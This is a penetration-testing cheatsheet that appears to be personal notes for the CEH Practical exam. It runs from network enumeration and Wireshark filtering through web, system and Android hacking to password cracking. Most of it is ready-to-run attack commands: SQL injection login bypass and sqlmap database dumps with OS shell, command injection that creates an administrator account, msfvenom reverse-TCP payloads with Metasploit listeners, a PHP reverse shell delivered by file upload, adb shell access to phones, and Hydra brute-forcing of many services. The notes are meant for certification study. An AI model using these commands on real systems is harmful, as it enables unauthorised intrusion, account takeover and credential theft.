<img src="/IMG/CEH-Practical-Logo.jpg">

# CEH-Practical-Notes-and-Tools
Successfully completed the CEH (Practical) exam by EC-Council with a score of 20/20! Took me around 2 hours 20 minutes to complete the 6 hour Proctored exam.  

> Just a typical CTF Player/Hacker going back to Basics 💻

> My Personal Notes that I used on the Exam as a Cheatsheet

# Network Hacking - Enumeration
<details>
  <summary>Netdiscover </summary>
  
## Netdiscover
  
* Scan Entire Network for ALive host using ARP
```console
netdiscover -i eth0
netdiscover -r x.x.x.1/24
```
* Enum
```console
1- NetBios enum using windows- in cmd type- nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)

2- NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.10.10.16

3- SNMP enum using nmap-  nmap -sU -p 161 10.10.10.10 (-p 161 is port for SNMP)--> Check if port is open
                          snmp-check 10.10.10.10 ( It will show user accounts, processes etc) --> for parrot

4- DNS recon/enum-  dnsrecon -d www.google.com -z

5- FTP enum using nmap-  nmap -p 21 -A 10.10.10.10 

6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)
				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
  ```
</details>

<details>
  <summary>Nmap </summary>
  
## Nmap

* To scan the live Host
```console
nmap -sP x.x.x.1/24                 
nmap -sn x.x.x.1/24
```

Null Scan
```console
nmap -sN x.x.x.x
```
* To find the Specific open port 
```console
nmap -p port x.x.x.1/24 --open
```
* To find the OS 
```console
nmap -O x.x.x.x 
```
* Comprehensive Scan
```console
nmap -Pn -A x.x.x.1/24 -vv --open   
```
* To find FQDN (Find the FQDN in a subnet/network)
```console
nmap -p389 –sV -iL <target_list>
```
```console
 nmap -p389 –sV <target_IP>
```

* Scanning Networks (always do sudo su) --> To be root

  Nmap scan for alive/active hosts command for 192.189.19.18
```console
nmap -A 192.189.19.0/24 or nmap -T4 -A ip
```
  
Zenmap/nmap command for TCP scan- First put the target ip in the Target: and then in the Command: put this command 
```console
nmap -sT -v 10.10.10.16
```
  
Nmap scan if firewall/IDS is opened, half scan 
```console
nmap -sS -v 10.10.10.16 
```
  
If even this the above command is not working then use this command  
```console
namp -f 10.10.10.16
```
Nmap scan for host discovery or OS- nmap -O 192.168.92.10 or you can use
```console
nmap -A 192.168.92.10
```

If host is windows then use this command - this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139).
```console
nmap --script smb-os-discovery.nse 192.168.12.22 
```

nmap command for source port manipulation, in this port is given or we use common port  
```console
nmap -g 80 10.10.10.10
```
```console  
-A command is aggressive scan it includes - OS detection (-O), Version (-sV), Script (-sS) and traceroute (--traceroute).
```
```console  
5- Identify Target system os with (Time to Live) TTL and TCP window sizes using wireshark- Check the target ip Time to live value with protocol ICMP. If it is 128 then it is windows, as ICMP value came from windows. If TTL is 64 then it is linux. Every OS has different TTL. TTL 254 is solaris.
```
Some extra RDP info
```console
Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
```
Some extra MYSQL info
```console
Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
```

</details>


<details>
  <summary>🔢 Enumeration Cheatsheet </summary>
	
# 🔢 Enumeration Cheatsheet

#### **General Enumeration:**

* ```
  nmap -vv -Pn -A -sC -sS -T 4 -p- 10.0.0.1
  ```
  * Verbose, syn, all ports, all scripts, no ping
* ```
  nmap -v -sS -A -T4 x.x.x.x
  ```
  * Verbose, SYN Stealth, Version info, and scripts against services.
* ```
  nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 [host]
  ```
  * Nmap script to scan for vulnerable SMB servers – WARNING: unsafe=1 may cause knockover
* ```
  netdiscover -r 192.168.1.0/24
  ```

#### **FTP Enumeration (21):** <a href="#toc475368978" id="toc475368978"></a>

* ```
  nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.0.0.1
  ```

#### **SSH (22):** <a href="#toc475368979" id="toc475368979"></a>

* ```
  ssh INSERTIPADDRESS 22
  ```

#### **SMTP Enumeration (25):** <a href="#toc475368980" id="toc475368980"></a>

* ```
  nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.0.0.1
  ```
* ```
  nc -nvv INSERTIPADDRESS 25
  ```
* ```
  telnet INSERTIPADDRESS 25
  ```

#### **Finger Enumeration (79):** <a href="#toc494187363" id="toc494187363"></a>

Download script and run it with a wordlist: [http://pentestmonkey.net/tools/user-enumeration/finger-user-enum](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum)

#### **Web Enumeration (80/443):** <a href="#toc475368981" id="toc475368981"></a>

* dirbuster (GUI)
* ```
  dirb http://10.0.0.1/
  ```
* ```
  nikto –h 10.0.0.1
  ```

#### **Pop3 (110):** <a href="#toc475368982" id="toc475368982"></a>

* ```
  telnet INSERTIPADDRESS 110
  ```
* ```
  USER [username]
  ```
* ```
  PASS [password]
  ```
  * To login
* ```
  LIST
  ```
  * To list messages
* ```
  RETR [message number]
  ```
  * Retrieve message
* ```
  QUIT
  ```
  * quits

#### **RPCBind (111):** <a href="#toc475368983" id="toc475368983"></a>

* ```
  rpcinfo –p x.x.x.x
  ```

#### **SMB\RPC Enumeration (139/445):** <a href="#toc475368984" id="toc475368984"></a>
```console

find ip using NMAP
-> smbclient -L \\IP >> for sharename
-> hydra -L userlist.txt -p passlist.txt ip smb


-> smbclient \\\\ip\\sharename -U user
type txt
```
* ```
  enum4linux –a 10.0.0.1
  ```
* `nbtscan x.x.x.x`
  * Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain
* ```
  py 192.168.XXX.XXX 500 50000 dict.txt
  ```
* ```
  python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX
  ```
* ```
  nmap IPADDR --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse
  ```
* ```
  smbclient -L //INSERTIPADDRESS/
  ```
  * List open shares
* ```
  smbclient //INSERTIPADDRESS/ipc$ -U john
  ```

#### **SNMP Enumeration (161):** <a href="#toc475368985" id="toc475368985"></a>

* ```
  snmpwalk -c public -v1 10.0.0.0
  ```
* ```
  snmpcheck -t 192.168.1.X -c public
  or
  snmp-check 192.168.63.2
  ```
* ```
  onesixtyone -c names -i hosts
  ```
* ```
  nmap -sT -p 161 192.168.X.X -oG snmp_results.txt
  ```
* ```
  snmpenum -t 192.168.1.X
  ```

#### **Oracle (1521):** <a href="#toc475368986" id="toc475368986"></a>

* ```
  tnscmd10g version -h INSERTIPADDRESS
  ```
* ```
  tnscmd10g status -h INSERTIPADDRESS
  ```

#### **Mysql Enumeration (3306):** <a href="#toc475368987" id="toc475368987"></a>

* ```
  nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
  ```

#### **DNS Zone Transfers:** <a href="#toc475368988" id="toc475368988"></a>

* ```
  nslookup -> set type=any -> ls -d blah.com
  ```
* ```
  dig axfr blah.com @ns1.blah.com
  ```
  * This one works the best in my experience
* ```
  dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
  ```

#### **Mounting File Share** <a href="#toc475368989" id="toc475368989"></a>

* ```
  showmount -e IPADDR
  ```
* ```
  mount 192.168.1.1:/vol/share /mnt/nfs  -nolock
  ```
  * mounts the share to /mnt/nfs without locking it
* ```
  mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs
  ```
  * Mount Windows CIFS / SMB share on Linux at /mnt/cifs if you remove password it will prompt on the CLI (more secure as it wont end up in bash\_history)
* ```
  net use Z: \\win-server\share password  /user:domain\janedoe /savecred /p:no
  ```
  * Mount a Windows share on Windows from the command line
* ```
  apt-get install smb4k –y
  ```
  * Install smb4k on Kali, useful Linux GUI for browsing SMB shares

#### **Fingerprinting:  Basic versioning / finger printing via displayed banner** <a href="#toc475368990" id="toc475368990"></a>

* ```
  nc -v 192.168.1.1 25
  ```
* ```
  telnet 192.168.1.1 25
  ```

#### **Exploit Research** <a href="#toc475368991" id="toc475368991"></a>

* ```
  searchsploit windows 2003 | grep -i local
  ```
  * Search exploit-db for exploit, in this example windows 2003 + local esc

#### **Compiling Exploits** <a href="#toc475368992" id="toc475368992"></a>

* ```
  gcc -o exploit exploit.c
  ```
  * Compile C code, add –m32 after ‘gcc’ for compiling 32 bit code on 64 bit Linux
* ```
  i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
  ```
  * Compile windows .exe on Linux

#### **Packet Inspection:** <a href="#toc475368993" id="toc475368993"></a>

* ```
  tcpdump tcp port 80 -w output.pcap -i eth0
  ```
  * tcpdump for port 80 on interface eth0, outputs to output.pcap

\
**
</details>

  <details>
  <summary>Wireshark</summary>
    
  ## Wireshark
  
  * Wireshark provides the feature of reassembling a stream of plain text protocol packets into a human-readable format
  
  ```shell
    select_packet > follow > TCP Stream
  ```
  
  * To the get the specific method like ( post , get )
  
  ```console
  http.request.method==post
  http.request.method==get
  ```
  * To the Find DOS & DDOS (SYN and ACK) : 
```console
tcp.flags.syn == 1 , tcp.flags.syn == 1 and tcp.flags.ack == 0
```
  * go to Statistics and Select Conversations , sort by packets in IPv4 based on number of Packets transfer
  
  ```shell
  Statistics > Conversations > IPv4 > Packets
  ```
* Wireshark summary
   
  ```console
  tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given

  tcp.flags.syn == 1   (Which machine for dos)

  http.request.method == POST   (for passwords) or click tools ---> credentials Also
  ```

 * Password Sniffing using Wireshark.  
In pcap file apply filter:- (you will get all the post request) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
```console
http.request.method==POST
```
### wireshark filters
```console
### wireshark filters

# // filters by post
http.request.method==POST
smtp // email
pop // email
dns.qry.type == 1 -T fields -e dns.qry.name = show records present in this pcap
dns.flags.response == 0 = There are 56 unique DNS queries.
tcp // show tcp packets
# //find packets
edit > find packets > packet list : packet bytes > case sensitive: strings > string "pass" :search

# //DDOS ATTACK
look number of packets first column
then >statistics > ipv4 statistics > destination and ports

# ///Capture Packets with tcpdump
tcpdump -i eth0 -w capture.pcap

# ///Analyze with Wireshark filters
http.request.method == "POST"
ftp.request.command == "USER" || ftp.request.command == "PASS"

# /// tshark cli
tshark -r dns.cap | wc -l //count how many packets are in a capture
tshark -r dns.cap -Y "dns.qry.type == 1" -T fields -e dns.qry.name //show records present in this pcap
tshark -r dnsexfil.pcap -Y "dns.flags.response == 0" | wc -l 
tshark -r pcap -T fields -e dns.qry.name | uniq | wc -l //There are 56 unique DNS queries.
tshark -r pcap | head -n2 //DNS server side to identify 'special' queries
tshark -r pcap -Y "dns.flags.response == 0" -T fields -e "dns.qry.name" | sed "s/.m4lwhere.org//g" | tr -d "\n" `exfiltrate data with regx`
```
</details>

<details>
  <summary>Covert TCP</summary>
  
  ## Covert TCP
  
  * [covert_TCP](Covert_TCP.c) 
  * In this we have to use Covert TCP technique to analyses the pcapng file.
  * Traverse though each line in Wireshark and concentrate on Identification field, keep an eye on Hex value and ANSI value.
  * Compile the Code
  ```console
cc -o covert_tcp covert_tcp.c
  ```
  * Reciever Machine(Client_IP)
  ```console
  sudo ./covert_tcp -dest Client_IP -source Attacker_IP -source_port 9999 -dest_port 8888 -server -file recieve.txt
  ```
  * Sender Machine(Attacker_IP)
  * Create A Message file that need to be transferred Eg: secret.txt
  ```console
  sudo ./covert_tcp -dest Client_IP -source Attacker_IP -source_port 8888 -dest_port 9999 -file secret.txt
  ```
 
 * Secret message sent using Covert_TCP and it is captured using Wireshark - [Pcap_of_Covert](Covert_TCP_Capture.pcapng)
 * The Secret text is -> Hello  This 123 -

  <img src="/IMG/CovertWireshark.jpg" />

 

</details>

<details>
  <summary> LLMNR/NBT</summary>
  
  ##  LLMNR/NBT-NS Poisoning

* [Responder](https://github.com/lgandx/Responder) - rogue authentication server to capture hashes.

* This can be used to get the already logged-in user's password, who is trying to access a shared resource which is not present.
  
* In Parrot/Kali OS, 

```console
responder -I eth0  
```

* In windows, try to access the shared resource, logs are stored at usr/share/responder/logs/SMB<filename>
* To crack that hash, use JohntheRipper

```console
john SMBfilename  
```
</details>

<details>
  <summary>Common Ports</summary>
  
 ## Common Port

* 21        - FTP
* 22        - SSH
* 23        - TELNET
* 3306      - MYSQL
* 389,3389  - RDP

</details>

<details>
  <summary>Port Login</summary>

  ## Port Login
    
  * FTP Login
    default username: anonymous
  ```console
    ftp x.x.x.x
  ```
If non standard port like 10021 
```console
    ftp x.x.x.x 10021
  ```
    
  * SSH Login  
  ```console
    ssh username@x.x.x.x
  ```
    
  * TELNET Login
  ```console
    telnet x.x.x.x
  ```
   
 </details>
</details>

# Web Hacking
<details>
	
<summary>HACKING WEB</summary>

@@ Hacking Web servers

```console
1- Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
						    GET /HTTP/1.0
						    telnet www.movies.com 80
						    GET /HTTP/1.0

2- Enumerate Web server info using nmap-  nmap -sV --script=http-enum www.movies.com

3- Crack FTP port using nmap-
nmap -p 21 10.10.10.10 (check if it is open or not)

ftp 10.10.10.10 (To see if it is directly connecting or need credentials if need. Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file. )

Now in terminal type-
hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
or
hydra -l user -P passlist.txt ftp://10.10.10.10
```

@@ Hacking Web Application
```console
1- Scan Using OWASP ZAP (Parrot)- Type 'zaproxy' in the terminal and then it would open. In target tab put the url and click automated scan.

2- Directory Bruteforcing
gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt

3- Enumerate a Web Application using WPscan & Metasploit BFA- (u means username) 
wpscan --url http://10.10.10.10:8080/NEW --enumerate u  

Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
 						 show options
						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
						 set RHOSTS 10.10.10.10  (target ip)
						 set RPORT 8080          (target port)
						 set TARGETURI http://10.10.10.10:8080/
						 set USERNAME admin

4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 

5- Command Injection-  | net user  (Find users)
 		       | dir C:\  (directory listing)
                       | net user Test/Add  (Add a user)
		       | net user Test      (Check a user)
		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
		       | net user Test      (Once again check to see if it has become administrator)
Now you can do a RDP connection with the given ip and the Test account which you created.
```
 </details>
<details>

 <summary>Enumeration</summary>

### Banner Grabbing
```console
nc -nv 192.168.1.5 80              # Netcat to check web server banner
 ```

 ### dir enumeration

 ```console
gobuster dir -u 10.10.. -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -q
```
```console
dir : directory listing
-u : host
-w : wordlists
-t : threads int / Number of concurrent threads (default 10)
-x : enumerate hidden files htm, php
-q : –quiet / Don’t print the banner and other noise

// wordpress enumeration
wpscan --url https://localchost.com --passwords=
wpscan -u 10.10.. -e u vp
wpscan -u 10.10.. -e u --wordlist path/rockyou.txt //bruteforce

-e = enumerate
u = enumerate usernames
vp = vulnerable plugins

// wordlist generation
cewl -w wordlist -d 2 -m 5 http://wordpress.com
-d = deeph of the scanning
-m = long of the words
-w = save to a file worlist
```
### enumerating -samba
```console
search for commands
smbmap --help | grep -i username

smbmap -u "admin" -p "passowrd" -H 10.10.10.10 -x "ipconfig"
-x = command
```
</details>
<details>

  <summary>Nslookup</summary>

* To verify Website's Ip
```console
Nslookup wwww.example.com
```
  </details>
  <details>
  <summary>File Upload</summary>
  
  ## File Upload Vulnerability
  
* To create a PHP Payload 
* Copy the PHP code and create a .php
  
```console
msfvenom -p php/meterpreter/reverse_tcp lhost=attacker-ip lport=attcker-port -f raw
```
  
* To create a Reverse_tcp Connection
```console
msfconsole
use exploit/multi/handler
set payload php/meterepreter/reverse_tcp
set LHOST = attacker-ip
set LPORT = attcker-port
run
```
  
* To find the secret file 
```console
  type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt
```
  </details>
<details>

 Summary
 ```console
1- Auth Bypass-  hi'OR 1=1 --

2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--

3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs

4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables

5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)

6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell

6.1 In the shell type-   TASKLIST  (to view the tasks)

6.2 Use systeminfo for windows to get all os version

6.3 Use uname -a for linux to get os version
```
  <summary>SQL Injection</summary>
  
  ## SQL Injection
  
  * Login bypass with [' or 1=1 --]
  

### SQLMAP
  
* List databases, add cookie values
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --dbs 
```
* OR
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low”   --data="id=1&Submit=Submit" --dbs  
```

* List Tables, add databse name
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name --tables  
```
* List Columns of that table
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --columns
```
* Dump all values of the table
```console
  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --dump
```

### DSSS
  
  * Damn Small SQLi Scanner ([DSSS](https://github.com/stamparm/DSSS)) is a fully functional SQL injection vulnerability scanner (supporting GET and POST parameters)

  * As of optional settings it supports HTTP proxy together with HTTP header values User-Agent, Referer and Cookie.

  ```console
  python3 dsss.py -u "url" --cookie="cookie"
  ```
  <img src="/IMG/DSSS/dsss1.jpg" />  

  
  * Open the binded URL
  
  <img src="/IMG/DSSS/dsss2.jpg" />  

  
  </details>



</details>

# System Hacking

<details>
  <summary>System</summary>
  
  ## System 

  * To create a Payload 
```console
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=attacker_IP LPORT=attacker_Port -o filename.exe 
```
* To take a reverse TCP connection from windows
```console
msfdb init && msfconsole 
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST= attacker-IP  
set LPORT= attacker-Port 
run
```

</details>

## Getting a proper TTYPermalink
Now lets get a proper shell with auto completion.

```console
$ python3 -c "import pty;pty.spawn('/bin/bash')"
```

Hit CRTL+z to background the current process and on local box type
```console
$:~ stty raw -echo
and type fg and hit enter twice and on the reverse shell export the TERM as xterm.
```
www-data@startup:/var/www/html/files/ftp$  export TERM=xterm
Now we have a proper shell.

### Reverse shell nc
```console
nc -nlvp 1234
```

```console
python3 -m http.server
```
```console
wget 10.10.169.81:8000/suspicious.pcapng (wget remote IP:port/filename)
```

### FILE search
FILE search
-> find / -name Flag.txt 2>/dev/null

# Android Hacking
<details>
<summary>Android</summary>

  ## Android
  
```console
1- nmap ip -sV -p 5555    (Scan for adb port)

2- adb connect IP:5555    (Connect adb with parrot)

3- adb shell              (Access mobile device on parrot)

4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
```

  <summary>ADB</summary>

  ## ADB
  
* To Install ADB
```console
apt-get update
sudo apt-get install adb -y
adb devices -l
```
* Connection Establish Steps

```console
adb connect x.x.x.x:5555
adb devices -l
adb shell  
```
* To navigate
```console
pwd
ls
cd Download
ls
cd sdcard
```
* Download a File from Android using ADB tool
```console
adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
adb pull sdcard/log.txt /home/mmurphy/Desktop
```
</details>
<details>
  <summary>PhoneSploit</summary>
  
## PhoneSploit tool
  
* To install Phonesploit 

```console
git clone https://github.com/aerosol-can/PhoneSploit
cd PhoneSploit
pip3 install colorama
OR
python3 -m pip install colorama
```
* To run Phonesploit
```console
python3 phonesploit.py

```

```console
* Type 3 and Press Enter to Connect a new Phone OR Enter IP of Android Device
* Type 4, to Access Shell on phone
* Download File using PhoneSploit

 cd /
-> cd sdcard search for flag img and then
-> pwd for file location
-> 9 for pulling img
-> location of img
-> where you want to save
Transfer to windows for decrypting using python server
```

9. Pull Folders from Phone to PC
```console

* Enter the Full Path of file to Download
sdcard/Download/secret.txt
```  
</details>

# Password Cracking & Hashing



<details>
  <summary>Wpscan</summary>
  
## Wordpress

* Wordpress site only Users Enumeration
```console
wpscan --url http://example.com/ceh --enumerate u
```
  * Direct crack if we have user/password detail
```console
wpscan --url http://x.x.x.x/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
wpscan --url http://x.x.x.x:8080/CEH -u <user> -P ~/wordlists/password.txt
```
</details>

<details>
  <summary>Hydra</summary>

## Hydra


### GUI
```console
xhydra
```
### FILE search
```console
-> find / -name Flag.txt 2>/dev/null
```
### RDP
```console
hydra -V -f -L usernames.txt -P passwords.txt rdp://10.0.2.5 -V
```
### SSH
```console
hydra -l username -P passlist.txt x.x.x.x ssh

hydra -l root -P passwords.txt -f ssh://10.0.2.5 -V
```
```console
hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.11
hydra -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.118
```
### FTP
```console
hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x

hydra -l user -P passlist.txt ftp://10.10.10.10
```
* If the service isn't running on the default port, use -s
```console
hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x -s 221
```
* Used to download the specific file from FTP to attacker or local machine
```console
get flag.txt ~/Desktop/filepath/flag.txt
get flag.txt .
```
### SMB
```console
hydra -l root -P passwords.txt -f smb://10.0.2.5 -V
```

### HTTP Basic Auth
```console
hydra -L users.txt -P password.txt 10.0.2.5 http-get /login/ -V
```
### HTTP POST
```console
# HTTP Post
hydra -L users.txt -P password.txt 10.0.2.5 http-post-form
"/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login
name or password is incorrect" -V
```
### IMAP
```console
# IMAP
hydra -l root -P passwords.txt -f imap://10.0.2.5 -V
```
### POP
```console
# POP
hydra -l USERNAME -P passwords.txt -f pop3://10.0.2.5 -V
```

### Post Web Form
```console
hydra -l -P 10.10.46.122 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```


### TELNET
```console
hydra -l admin -P passlist.txt -o test.txt x.x.x.x telnet
```
### Other Examples
```console
Rexec
hydra -l root -P password.txt rexec://10.0.2.5 -V

Rlogin
hydra -l root -P password.txt rlogin://10.0.2.5 -V

RSH
hydra -L username.txt rsh://10.0.2.5 -V

RSP
hydra -l root -P passwords.txt <IP> rtsp

SMTP
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V
#Port 587 for SMTP with SSL

Telnet
hydra -l root -P passwords.txt [-t 32] <IP> telnet

VNC
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT>
<IP> vnc
```
</details>

<details>
<summary>hash</summary>

## hash
<summary>hash</summary>

### Using Hashcat
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

### hashcat -a attack mode -m hashtype 900 md4 1000 NTLM 1800 SHA512CRYPT 110 SHA1 with SALT HASH 0 MD5 100 SHA1 1400 SHA256 3200 BCRYPT 160 HMAC-SHA1
```console
Hashcat -a 3 -m 900 hash.txt /rockyou.txt
```
### Hash Identifier 
```console
https://www.onlinehashcrack.com/hash-identification.php
```
### Hash-identifier (CLI)
#### Hash Crack 
```console
https://crackstation.net/ https://hashes.com/en/decrypt/hash
```

</details>



<details>
<summary>John</summary>

# John

### Using John
```console
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```


## Commands Formats

```console
john --list=formats
```

### Crack SHA1

```console
john  --format=raw-sha1 hash.txt
```

### Crack MD5

```console
john --format=raw-md5 hash.txt
```

### Cracking Shadow Files

# Unshadow
unshadow passwd.txt shadow.txt > unshadowed.txt


# John
		
john /etc/shadow

<strong># Wordlist
john --wordlist=&#x3C;password.txt> /etc/shadow

### Cracking Zip Files

```console
# Zip to John
zip2john file.zip > ziphash.txt

```
```console
# John
john --format=zip ziphash.txt
```

### Crack .pfx File

```console
pfx2john <pfx file> > hash.txt

john hash.txt --wordlist=<wordlist location>
```

### Crack GPG Passphrase

**Read More** [Here](https://blog.atucom.net/2015/08/cracking-gpg-key-passwords-using-john.html)

```console
gpg2john priv.key > hash 

john hash --wordlist=/usr/share/wordlists/rockyou.txt 
```

### Crack SSH Passphrase

```console
ssh2john /home/chinju/.ssh/id_rsa > ssh_hash.txt

john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

 </details>
  
# Steganography
  
  <details>
	  <summary>Steganography</summary>
	  
## Steganography
	  
### Extract files from images
```console
steghide extract -sf secret.jpg
```
### Find hidden strings
```console
strings suspect.png | less
 ```
  </details>
  
  <details>
	  <summary>Snow</summary>

### Snow
    
* Whitespace Steganography using [Snow](https://darkside.com.au/snow/snwdos32.zip)
* To hide the Text  
  
```console
SNOW.EXE -C -p test -m "Secret Message" original.txt hide.txt
```

* To unhide the Hidden Text

```console
SNOW.EXE -C -p test hide.txt
```
kali Hide Data Using Whitespace Stegnography- (magic is password and your secret is stored in readme2.txt along with the content of readme.txt)
```console
snow -C -m "My swiss account number is 121212121212" -p "magic" readme.txt readme2.txt  
```
To Display Hidden Data-(then it will show the content of readme2.txt content) 
```console
snow -C -p "magic" readme2.txt
```
<img src="/IMG/Snow.png"/>

</details>

<details>
  <summary>CrypTool</summary>
  
  ### CrypTool
  
  * [CrypTool](https://www.cryptool.org/en/ct1/downloads) for hex 
  
  <img src = "/IMG/Cryptool/CT.png"/>
  
  * To Encrypt
  
  <img src = "/IMG/Cryptool/CT5.png"/>
  <img src = "/IMG/Cryptool/CT6.png"/>
  
  * Use Key 05 
  
  <img src = "/IMG/Cryptool/CT7.png"/>
  <img src = "/IMG/Cryptool/CT8.png"/>
  <img src = "/IMG/Cryptool/CT9.png"/>
  <img src = "/IMG/Cryptool/CT10.png"/>
  <img src = "/IMG/Cryptool/CT11.png"/>
  
  * To Decrypt
  
  <img src = "/IMG/Cryptool/CT12.png"/>
  <img src = "/IMG/Cryptool/CT13.png"/>
  <img src = "/IMG/Cryptool/CT14.png"/>
  <img src = "/IMG/Cryptool/CT15.png"/>
  <img src = "/IMG/Cryptool/CT16.png"/>
 </details>
  
 <details>
   <summary>HashCalc</summary>
   
   ## HashCalc
    
   * HashCalc Interface.
   <img src = "/IMG/HashCalc/Hcal1.png"/>

   * Create a text file.
   <img src = "/IMG/HashCalc/Hcal2.png"/>
   
   * Choose text file.
   <img src = "/IMG/HashCalc/Hcal3.png"/>
   
   * Hash Value of text file.
   <img src = "/IMG/HashCalc/Hcal4.png"/>
   
   * Modify the text inside the file. 
   <img src = "/IMG/HashCalc/Hcal5.png"/>
   
   * Compare the hash, It will vary.
   <img src = "/IMG/HashCalc/Hcal6.png"/>
   
 </details>

  <details>
    <summary>HashMyFile</summary>
 
  ## HashMyFile  
    
  * HashMyFile Application
  <img src = "/IMG/HashMyFile/HMF1.png"/>
    
  * add folder to Hash the file presented in Folder  
  <img src = "/IMG/HashMyFile/HMF2.png"/>  
  <img src = "/IMG/HashMyFile/HMF3.png"/>

  * After Hash the file
  <img src = "/IMG/HashMyFile/HMF4.png"/>
    
  * Add More Hashing Format
  <img src = "/IMG/HashMyFile/HMF5.png"/>
</details>
  
  <details>
    <summary>MD5 Calculator</summary>
    
    ## MD5 Calculator  
  
  * Create a text file contains "Hello" and save it, Right click the file to compare hash. 
  <img src = "/IMG/MD5 Calc/MD5Calc1.png"/>  
  
  * MD5 Hash of text file
  <img src = "/IMG/MD5 Calc/MD5Calc2.png"/> 
  
  <img src = "/IMG/MD5 Calc/MD5Calc3.png"/>  
  
